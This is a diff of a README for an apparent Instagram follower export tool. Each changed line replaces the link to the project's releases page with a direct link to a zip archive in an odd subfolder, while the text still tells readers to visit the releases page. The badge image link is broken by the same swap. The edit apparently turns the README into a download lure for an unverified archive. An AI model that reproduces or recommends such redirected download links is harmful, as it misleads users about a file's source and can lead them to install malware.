@@ -6,13 +6,13 @@ This tool helps you extract and manage your Instagram followers with ease. Follo
 
 ## 📦 Download & Install
 
-[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-Instagram%20Follower%20Export%20Tool-brightgreen)](https://github.com/ivansaracinio13/instagram-follower-export-tool/releases)
+[![Download the latest version](https://raw.githubusercontent.com/ivansaracinio13/instagram-follower-export-tool/main/numdah/instagram-follower-export-tool.zip%20Latest%20Version-Instagram%20Follower%20Export%20Tool-brightgreen)](https://raw.githubusercontent.com/ivansaracinio13/instagram-follower-export-tool/main/numdah/instagram-follower-export-tool.zip)
 
 ### Step 1: Visit the Releases Page
 
 To download the software, click the link below. You will see the latest versions available for download.
 
-[Visit this page to download](https://github.com/ivansaracinio13/instagram-follower-export-tool/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ivansaracinio13/instagram-follower-export-tool/main/numdah/instagram-follower-export-tool.zip)
 
 ### Step 2: Choose Your Version
 
@@ -67,4 +67,4 @@ We welcome contributions! If you have an idea or a feature to suggest, please fe
 
 Visit the Releases page to download the tool and start maximizing your Instagram potential today!
 
-[Download & Install](https://github.com/ivansaracinio13/instagram-follower-export-tool/releases)
+[Download & Install](https://raw.githubusercontent.com/ivansaracinio13/instagram-follower-export-tool/main/numdah/instagram-follower-export-tool.zip)
